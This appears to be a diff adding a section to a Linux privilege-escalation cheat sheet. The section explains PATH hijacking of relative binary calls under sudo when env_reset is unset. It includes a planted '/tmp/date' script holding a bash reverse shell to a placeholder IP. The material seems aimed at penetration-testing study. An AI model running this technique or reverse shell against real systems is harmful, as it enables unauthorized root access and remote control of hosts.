@@ -41,6 +41,46 @@ sudo /bin/bash
 sudo passwd
 ```
 
+## Without env_reset
+
+If `env_reset` is not set in `/etc/sudoers` (it is by default) then you might be able to exploit a relative path in an application executed via sudo.
+
+For example you might be allowed to run a script via sudo:
+
+```bash
+sudo /example/somescript.sh
+```
+
+And that script/binary executes another script/binary. E.g.:
+
+```bash
+#!/bin/bash
+# somescript.sh
+gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
+```
+
+Here the `date` is not the absolute path of `/bin/date` and you can inject your own version.
+
+Because the `env_reset` is not set, your own local user PATH environment variable will be used when you use sudo.
+
+Add a directory you control at the start of your PATH (e.g. /tmp/):
+
+```bash
+export PATH=/tmp/:$PATH
+```
+
+Create a shell script or binary `/tmp/date` and make it executable.
+
+```bash
+#!/bin/bash
+# date exploit
+# example: reverse shell
+bash -i >& /dev/tcp/10.10.10.10/4242 0>&1
+```
+
+When you run the sudo command `sudo /example/somescript.sh`, then your injected `/tmp/date` will be executed instead of `/bin/date`.
+
+
 ## Limited Sudo
 
 If your sudo privileges are restricted to some specific programs, then look for possible escape methods:
